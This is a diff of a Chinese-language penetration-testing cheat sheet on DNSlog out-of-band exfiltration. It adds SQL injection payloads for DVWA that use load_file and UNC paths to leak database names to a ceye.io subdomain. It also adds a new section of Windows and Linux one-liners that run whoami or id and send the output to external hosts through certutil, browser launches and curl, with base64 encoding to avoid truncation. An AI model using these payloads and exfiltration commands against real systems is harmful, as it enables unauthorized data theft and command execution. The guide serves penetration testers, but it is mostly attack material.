@@ -10,10 +10,10 @@
         - [SQL Server](#sql-server)
         - [Oracle](#oracle)
         - [PostgreSQL](#postgresql)
+    - [SQLMap配合DNSlog](#sqlmap配合dnslog)
     - [命令执行](#命令执行)
     - [SSRF](#ssrf)
     - [XSS](#xss)
-    - [SQLMap配合DNSlog](#sqlmap配合dnslog)
     - [其他](#其他)
         - [XML Entity Injection](#xml-entity-injection)
         - [Struts2](#struts2)
@@ -22,6 +22,9 @@
         - [ImageMagick](#imagemagick)
         - [Resin](#resin)
 - [DNSlog平台的搭建](#dnslog平台的搭建)
+- [扩展：HTTP log](#扩展http-log)
+- [windows](#windows)
+- [Linux](#linux)
 - [参考](#参考)
 
 <!-- /TOC -->
@@ -52,7 +55,9 @@
 
 主体语句：`select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv'));`
 
-dvwa实战语句：`1' and if((select load_file(concat('\\\\',hex((select 212)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
+dvwa实战语句1：`1' and if((select load_file(concat('\\\\',hex((select 212)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
+
+dvwa实战语句2：`1' and if((select load_file(concat('\\\\',hex((select schema_name from information_schema.schemata limit 0,1)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
 
 
 **UNC路径**
@@ -99,6 +104,8 @@ END;
 $ LANGUAGE plpgsql SECURITY DEFINER;
 SELECT temp_function();
 ```
+
+### SQLMap配合DNSlog
 
 ### 命令执行
 * Linux
@@ -149,7 +156,7 @@ ping %USERNAME%.b182oj.ceye.io
 
 ### XSS
 
-### SQLMap配合DNSlog
+
 
 ### 其他
 #### XML Entity Injection
@@ -198,6 +205,22 @@ xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.por
 &emsp;在我们实际的渗透中，我们不想使用一些别人家搭建的DNSlog平台，比较还是有可能被记录在别人的服务器上面的，这就涉及到保密的问题，那么就需要有自己可控的DNSlog平台。
 &emsp;这里推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项目主页是有搭建教程的，按自己的需求搭建。
 
+
+## 扩展：HTTP log
+&emsp;除开利用DNS的log，在可以执行系统命令的情况还可以利用HTTP的log，就是通过中间件的日志来获取结果。
+
+## windows 
+`for /F %x in ('whoami') do start https://www.dark5.net/%x` #启动浏览器访问
+`for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #内置命令行工具访问
+
+## Linux
+`for /F "delims=\" %i in ('whoami') do curl http://www.dark5.net/%i`
+
+如果碰到内容有空格（换行符等），就会截断，只输出前面的，这时候可以利用编码来输出，但有输出字符数最大限制；
+```
+curl http://xxx.dnslog.link/$(id|base64)
+curl http://xxx.dnslog.link/`id|base64`
+```
 
 ## 参考
 [dnslog利用](http://byd.dropsec.xyz/2016/12/04/dnslog%E5%88%A9%E7%94%A8/)
